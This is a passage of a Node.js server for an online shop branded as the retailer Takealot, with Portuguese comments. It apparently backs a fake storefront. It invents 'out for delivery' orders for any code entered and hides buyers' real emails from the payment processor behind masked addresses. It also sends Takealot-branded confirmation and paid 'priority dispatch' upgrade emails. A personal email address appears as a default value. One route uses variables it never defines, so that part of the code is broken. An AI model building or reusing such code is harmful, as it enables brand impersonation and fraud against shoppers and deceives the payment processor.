      const ordersFile = path.join(ROOT_DIR, 'data', 'orders.json');
      const orders = fs.existsSync(ordersFile) ? JSON.parse(fs.readFileSync(ordersFile, 'utf8') || '{}') : {};
      
      if (orders[code]) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true, order: orders[code] }));
      }

      for (const k of Object.keys(orders)) {
        if (k.toUpperCase() === code || orders[k].waybill?.toUpperCase() === code) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ success: true, order: orders[k] }));
        }
      }

      // Se começa com TAK-, gera dinamicamente
      if (code.startsWith('TAK') || code.length >= 6) {
        const is75 = code.includes('75');
        const dynamicOrder = {
          order_id: code,
          tracking_code: code,
          courier: "Takealot Fast Delivery Team",
          waybill: "WB-ZAF-" + Math.floor(100000 + Math.random() * 900000),
          status: "in_transit",
          status_text: "Out for Delivery",
          status_step: 3,
          customer_name: "Valued Customer",
          customer_email: "customer@takealot.co.za",
          customer_phone: "+27 82 555 1234",
          delivery_address: "Cape Town & Surrounds, South Africa",
          product_title: 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)',
          product_image: 'https://iili.io/oKD3ZQa.jpg',
          screen_size: '9kg',
          quantity: 1,
          amount: 1299,
          currency: "ZAR",
          created_at: new Date().toLocaleDateString('en-ZA', { day: 'numeric', month: 'short', year: 'numeric' }),
          estimated_delivery: "2 - 4 Business Days"
        };
        orders[code] = dynamicOrder;
        fs.writeFileSync(ordersFile, JSON.stringify(orders, null, 2));

        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true, order: dynamicOrder }));
      }

      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: 'Order not found' }));
    } catch(e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: e.message }));
    }
  }

  // 1.8 Rota para Salvar Checkout Abandonado
  if (req.method === 'POST' && (pathname === '/api/save-abandoned-checkout' || pathname === '/api/save-abandoned-checkout.php')) {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        const email = (data.email || '').trim().toLowerCase();
        if (email && email.includes('@')) {
          const abandonedFile = path.join(ROOT_DIR, 'data', 'abandoned_checkouts.json');
          const abandoned = fs.existsSync(abandonedFile) ? JSON.parse(fs.readFileSync(abandonedFile, 'utf8') || '{}') : {};
          const leadId = crypto.createHash('md5').update(email).digest('hex');
          const maskedEmail = data.gateway_email || generateDeterministicBuyerEmail(email);
          abandoned[leadId] = {
            id: leadId,
            email: email,                    // E-mail real para onde o GreenSend dispara as mensagens
            gateway_email: maskedEmail,      // E-mail mascarado determinístico para o processador
            name: data.name || 'Customer',
            phone: data.phone || '',
            product_title: data.product_title || 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)',
            amount: data.amount || 1299,
            quantity: data.quantity || 1,
            created_at: new Date().toISOString(),
            status: "abandoned",
            recovery_sent: false
          };
          fs.writeFileSync(abandonedFile, JSON.stringify(abandoned, null, 2));
          console.log(`[Lead Abandonado Capturado]: ${email} (Gateway: ${maskedEmail}) - ${data.product_title}`);
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch(e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  // 1.9 Rota para disparar e-mails de recuperação de checkout
  if (pathname === '/api/send-recovery-sequence' || pathname === '/api/process-abandoned-checkouts') {
    const stepParam = parseInt(parsedUrl.searchParams.get('step') || '0', 10);
    const targetEmail = (parsedUrl.searchParams.get('email') || '').trim().toLowerCase();

    const abandonedFile = path.join(ROOT_DIR, 'data', 'abandoned_checkouts.json');
    const abandoned = fs.existsSync(abandonedFile) ? JSON.parse(fs.readFileSync(abandonedFile, 'utf8') || '{}') : {};

    let sentCount = 0;
    const now = Date.now();

    for (const id of Object.keys(abandoned)) {
      const lead = abandoned[id];
      if (lead.status === 'completed') continue;
      if (targetEmail && lead.email !== targetEmail) continue;

      if (stepParam > 0) {
        const success = await sendRecoverySequenceEmail(stepParam, lead);
        if (success) {
          lead.recovery_step = stepParam;
          lead.last_recovery_sent = new Date().toISOString();
          sentCount++;
        }
      } else {
        const createdAt = new Date(lead.created_at || now).getTime();
        const diffMinutes = Math.round((now - createdAt) / (1000 * 60));
        const diffHours = Math.round(diffMinutes / 60);
        const curStep = parseInt(lead.recovery_step || 0, 10);

        if (diffMinutes >= 15 && curStep < 1) {
          if (await sendRecoverySequenceEmail(1, lead)) {
            lead.recovery_step = 1;
            lead.last_recovery_sent = new Date().toISOString();
            sentCount++;
          }
        } else if (diffHours >= 6 && curStep === 1) {
          if (await sendRecoverySequenceEmail(2, lead)) {
            lead.recovery_step = 2;
            lead.last_recovery_sent = new Date().toISOString();
            sentCount++;
          }
        } else if (diffHours >= 24 && curStep === 2) {
          if (await sendRecoverySequenceEmail(3, lead)) {
            lead.recovery_step = 3;
            lead.last_recovery_sent = new Date().toISOString();
            sentCount++;
          }
        }
      }
    }

    if (sentCount > 0) {
      fs.writeFileSync(abandonedFile, JSON.stringify(abandoned, null, 2));
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true, processed: sentCount }));
  }

  // 1.95 Rota para envio do e-mail de Upgrade de Frete Prioritário
  if (pathname === '/api/send-shipping-upgrade' || pathname === '/api/send-shipping-upgrade.php') {
    const orderId = (parsedUrl.searchParams.get('order') || 'TAK-75-343042').trim().toUpperCase();
    const targetEmail = (parsedUrl.searchParams.get('email') || '').trim().toLowerCase();

    try {
      const ordersFile = path.join(ROOT_DIR, 'data', 'orders.json');
      const orders = fs.existsSync(ordersFile) ? JSON.parse(fs.readFileSync(ordersFile, 'utf8') || '{}') : {};
      const order = orders[orderId] || {
        order_id: orderId,
        customer_name: "Christiano",
        customer_email: targetEmail || "pchristiano384@gmail.com",
        product_title: 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)',
        product_image: "https://iili.io/oKD3ZQa.jpg"
      };

      if (targetEmail) {
        order.customer_email = targetEmail;
        order.email = targetEmail;
      }

      const sent = await sendPriorityUpgradeEmail(order);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: sent, order_id: orderId, to: order.customer_email || order.email }));
    } catch(err) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: err.message }));
    }
  }

  // 1.96 Rota para envio do e-mail de Confirmação de Pedido
  if (pathname === '/api/send-confirmation-email' || pathname === '/api/send-confirmation-email.php') {
    const orderId = (parsedUrl.searchParams.get('order') || 'TAK-90-841920').trim().toUpperCase();
    const targetEmail = (parsedUrl.searchParams.get('email') || '').trim().toLowerCase();

    try {
      const ordersFile = path.join(ROOT_DIR, 'data', 'orders.json');
      const orders = fs.existsSync(ordersFile) ? JSON.parse(fs.readFileSync(ordersFile, 'utf8') || '{}') : {};
      const order = orders[orderId] || {
        order_id: orderId,
        name: "Christiano",
        email: targetEmail || "pchristiano384@gmail.com",
        amount: 1299,
        quantity: 1,
        address: "15 Long Street, Gardens, Cape Town, 8001",
        product_title: 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)',
        product_image: "https://iili.io/oKD3ZQa.jpg"
      };

      if (targetEmail) {
        order.email = targetEmail;
        order.customer_email = targetEmail;
      }

      const sent = await sendGreenSendConfirmationEmail(order);
          // Disparar evento Purchase no Meta CAPI (Server-Side)
          sendMetaCapiEvent('Purchase', {
            ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim(),
            userAgent: req.headers['user-agent'],
            email: cEmail,
            phone: meta.customer_phone || evData.customer_phone,
            name: meta.recipient_name,
            amount: evData.amount,
            title: meta.product_title || evData.title,
            orderId: upOrderId,
            eventId: upOrderId,
            fbclid: meta.fbclid,
            sourceUrl: 'https://takealot.com/obrigado.html'
          });

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: sent, order_id: orderId, to: order.email }));
    } catch(err) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: err.message }));
    }
  }

  // 2. Rota de webhook
  if (req.method === 'POST' && (pathname === '/api/webhook' || pathname === '/api/webhook.php' || pathname === '/api/webhook.js')) {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      const signature = req.headers['x-ghost-signature'] || '';
      console.log('[Ghost Pay Webhook] Recebido:', body);

      if (signature) {
        const expected = crypto.createHmac('sha256', GHOST_WEBHOOK_SECRET).update(body).digest('hex');
        if (signature !== expected) {
          console.warn('[Ghost Pay Webhook] Assinatura inválida!');
          res.writeHead(401, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Invalid signature' }));
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ received: true }));

      // Disparar e-mail de confirmação se evento for pagamento concluído
      try {
        const event = JSON.parse(body || '{}');
        const evType = event.event || '';
        const evData = event.data || {};
        if (evType === 'charge.completed' || evData.status === 'COMPLETED') {
          const meta = evData.metadata || {};
          let cEmail = (meta.real_email || (evData.customer_email && !evData.customer_email.startsWith('buyer_') ? evData.customer_email : '') || meta.customer_email || '').trim().toLowerCase();

          // Fallback para recuperar o e-mail real do pedido registrado
          const upOrderId = meta.order_id || 'TAK-75-343042';
          try {
            const ordersFile = path.join(ROOT_DIR, 'data', 'orders.json');
            if (fs.existsSync(ordersFile)) {
              const orders = JSON.parse(fs.readFileSync(ordersFile, 'utf8') || '{}');
              if (orders[upOrderId] && orders[upOrderId].customer_email && !orders[upOrderId].customer_email.startsWith('buyer_')) {
                cEmail = orders[upOrderId].customer_email;
              }
            }
          } catch(e) {}

          // A. Se for pagamento do Upgrade de Frete Expresso
          if (meta.type === 'shipping_upgrade' || (evData.title && evData.title.includes('Priority Dispatch'))) {
            const upOrderId = meta.order_id || 'TAK-75-343042';
            try {
              const ordersFile = path.join(ROOT_DIR, 'data', 'orders.json');
              const orders = fs.existsSync(ordersFile) ? JSON.parse(fs.readFileSync(ordersFile, 'utf8') || '{}') : {};
              if (orders[upOrderId]) {
                orders[upOrderId].priority_upgraded = true;
                orders[upOrderId].courier = "Takealot Express Priority Fleet";
                orders[upOrderId].estimated_delivery = "Tomorrow / 24 - 48 Hours (Express Priority)";
                orders[upOrderId].status_text = "Express Priority - Out for Delivery";
                fs.writeFileSync(ordersFile, JSON.stringify(orders, null, 2));
                console.log(`[Webhook] Upgrade de Frete Expresso ativado para pedido #${upOrderId}`);
              }
            } catch(e) {
              console.error('[Webhook Upgrade Error]:', e);
            }
            return;
          }

          // B. Marca checkout abandonado como pago
          if (cEmail) {
            try {
              const abandonedFile = path.join(ROOT_DIR, 'data', 'abandoned_checkouts.json');
              if (fs.existsSync(abandonedFile)) {
                const abandoned = JSON.parse(fs.readFileSync(abandonedFile, 'utf8') || '{}');
                const leadId = crypto.createHash('md5').update(cEmail).digest('hex');
                if (abandoned[leadId]) {
                  abandoned[leadId].status = 'completed';
                  abandoned[leadId].completed_at = new Date().toISOString();
                  fs.writeFileSync(abandonedFile, JSON.stringify(abandoned, null, 2));
                  console.log(`[Lead Convertido em Venda]: ${cEmail}`);
                }
              }
            } catch(e) {}
          }

          // 2. Dispara e-mail de confirmação Takealot
          sendGreenSendConfirmationEmail({
            email: cEmail,
            name: meta.recipient_name || 'Customer',
            order_id: meta.order_id || evData.id,
            amount: evData.amount,
            quantity: meta.quantity || 1,
            address: meta.delivery_address || 'South Africa'
          });
          // Disparar evento Purchase no Meta CAPI (Server-Side)
          sendMetaCapiEvent('Purchase', {
            ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim(),
            userAgent: req.headers['user-agent'],
            email: cEmail,
            phone: meta.customer_phone || evData.customer_phone,
            name: meta.recipient_name,
            amount: evData.amount,
            title: meta.product_title || evData.title,
            orderId: upOrderId,
            eventId: upOrderId,
            fbclid: meta.fbclid,
            sourceUrl: 'https://takealot.com/obrigado.html'
          });

        }
      } catch(err) {
        console.error('[Webhook Processing Error]:', err);
      }
    });
    return;
  }

  // 3. Servir arquivos estáticos (HTML, imagens, etc.)
  let filePath = path.join(ROOT_DIR, pathname === '/' ? 'index.html' : pathname);

  // Proteger .env e arquivos de sistema
  if (path.basename(filePath).startsWith('.') || filePath.includes('.git')) {
    res.writeHead(403);
    return res.end('Access Denied');
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      // Tenta adicionar .html
      if (fs.existsSync(filePath + '.html')) {
        filePath += '.html';
      } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        return res.end('404 Not Found');
      }
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    res.writeHead(200, { 'Content-Type': contentType });
    fs.createReadStream(filePath).pipe(res);
  });
});

server.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`  Takealot Store Local Server rodando em:`);
  console.log(`  http://localhost:${PORT}/index.html`);
  console.log(`  http://localhost:${PORT}/checkout.html`);
  console.log(`======================================================\n`);
});
